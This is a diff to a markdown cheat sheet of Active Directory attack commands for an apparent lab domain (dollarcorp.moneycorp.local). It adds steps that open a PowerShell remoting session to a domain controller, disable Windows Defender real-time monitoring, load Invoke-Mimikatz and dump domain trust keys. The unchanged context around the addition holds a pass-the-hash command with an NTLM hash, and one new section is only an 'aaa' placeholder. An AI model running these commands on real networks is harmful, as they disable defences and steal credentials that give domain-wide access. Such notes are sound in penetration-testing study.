@@ -3041,6 +3041,21 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.money
 Privilege::debug
 sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe
 ```
-
+##### MIMIKATZ - MIMIKATZ VIA PSREMOTING
+```
+$MYSESSION = New-PSSession -computername dcorp-dc
+Enter-PSSession $MYSESSION
+Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
+exit
+```
+```
+Invoke-Command -Filepath C:\pentest\gato\Invoke-Mimikatz.ps1 -session $MYSESSION
+Enter-PSSession $MYSESSION
+Invoke-Mimikatz -Command '"lsadump::trust /patch"'
+```
+##### MIMIKATZ - TRUST
+```
+aaa
+```
 
 
